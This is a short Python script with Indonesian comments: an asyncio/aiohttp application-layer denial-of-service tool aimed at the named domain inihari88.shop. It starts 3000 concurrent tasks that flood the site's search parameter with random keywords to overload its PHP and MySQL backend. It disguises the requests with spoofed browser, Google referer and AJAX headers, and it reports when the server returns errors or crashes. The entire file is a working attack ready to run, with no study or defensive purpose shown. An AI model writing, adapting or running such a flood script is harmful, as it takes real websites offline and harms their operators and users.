import asyncio
import aiohttp
import random
import string

# Ganti ke URL pencarian atau endpoint dinamis lainnya
TARGET_BASE = "https://inihari88.shop/"

def random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def power_attack(session):
    while True:
        try:
            # Kita tembak fitur pencarian dengan keyword acak
            # Ini memaksa PHP dan MySQL bekerja keras
            payload = random_string(15)
            url = f"{TARGET_BASE}?s={payload}" 
            
            headers = {
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,xml;q=0.9",
                "Referer": "https://www.google.com/",
                "X-Requested-With": "XMLHttpRequest" # Pura-pura jadi request AJAX
            }

            async with session.get(url, headers=headers, timeout=10) as response:
                status = response.status
                if status == 200:
                    print(f"[!] DB Stress Sent | Status: {status} | Keyword: {payload}")
                elif status >= 500:
                    print(f"[🔥] SERVER CRASHED / OVERLOAD! | Status: {status}")
                else:
                    print(f"[*] Response: {status}")
                
                # Jangan biarkan koneksi cepat mati
                await response.content.read(10)
        except Exception:
            await asyncio.sleep(0.05)

async def main():
    print(f"--- MENGIRIM SERANGAN DINAMIS KE: {TARGET_BASE} ---")
    
    # TCPConnector tanpa limit untuk performa maksimal
    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as session:
        # Jalankan 3000-5000 tasks jika RAM kamu kuat
        tasks = [power_attack(session) for _ in range(3000)]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[!] Dihentikan.")
